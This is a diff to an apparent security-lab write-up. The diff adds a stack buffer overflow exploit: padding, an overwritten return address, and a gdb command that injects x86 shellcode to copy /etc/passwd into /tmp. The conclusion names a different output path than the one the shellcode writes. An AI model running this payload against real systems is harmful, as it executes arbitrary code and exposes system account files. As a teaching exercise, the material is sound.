@@ -100,6 +100,22 @@ And here is the shellcode in machine format, which is 97 bytes long.
 
 Consider the stack frame of the main function.
 
-<img width="500" alt="Screenshot" src=""><br>
+<img width="500" alt="Screenshot" src="https://github.com/DaronD1709/Information-Security/blob/main/Security_Lab/img/Screenshot%202024-10-21%20at%2009.46.51.png"><br>
 
-**Conclusion**: comment text about the screenshot or simply answered text for the question
+```
+Padding to overflow the buffer
+ "a" * 20
+```
+
+```
+Address to overwrite the return address is :
+'\x30\xd6\xff\xff'
+```
+
+- Then eject the shellcode into :
+
+```
+run $(python3 -c "print('\x31\xc0\xb0\x05\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x8d\x5c\x24\x01\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x66\x6a\xff\x5a\xcd\x80\x89\xc6\x6a\x05\x58\x31\xc9\x51\x68\x66\x69\x6c\x65\x68\x2f\x6f\x75\x74\x68\x2f\x74\x6d\x70\x89\xe3\xb1\x42\x66\x68\xa4\x01\x5a\xcd\x80\x89\xc3\x6a\x04\x58\x89\xf9\x89\xf2\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x05\xcd\x80' + 'a' * 20 + '\x30\xd6\xff\xff')")
+```
+
+**Conclusion**: the /etc/passwd file will be copied to /tmp/pwfile. This demonstrates how a buffer overflow vulnerability can be exploited to execute arbitrary code.
